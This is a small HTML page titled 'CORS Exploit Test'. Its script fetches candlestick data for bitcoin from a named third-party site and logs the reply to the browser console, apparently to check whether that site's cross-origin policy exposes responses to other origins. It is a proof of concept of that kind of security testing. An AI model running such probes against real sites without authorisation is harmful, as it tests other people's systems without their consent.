<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Exploit Test</title>
</head>
<body>
    <h1>CORS Exploit Test</h1>
    <script>
        // Perform the fetch request to the target URL
        fetch('https://www.digtoon.com/sysmoloneaction/?kline=1&type=3&line=1min&sysmol=btc')
        .then(response => {
            // If the request is successful, log the response as text or JSON
            if (response.ok) {
                return response.json();  // or use response.text() for text data
            } else {
                console.log("Failed to fetch data. Status:", response.status);
            }
        })
        .then(data => {
            // Output the data to the browser console
            console.log("Response Data:", data);
        })
        .catch(error => {
            console.error("Error occurred:", error);
        });
    </script>
</body>
</html>
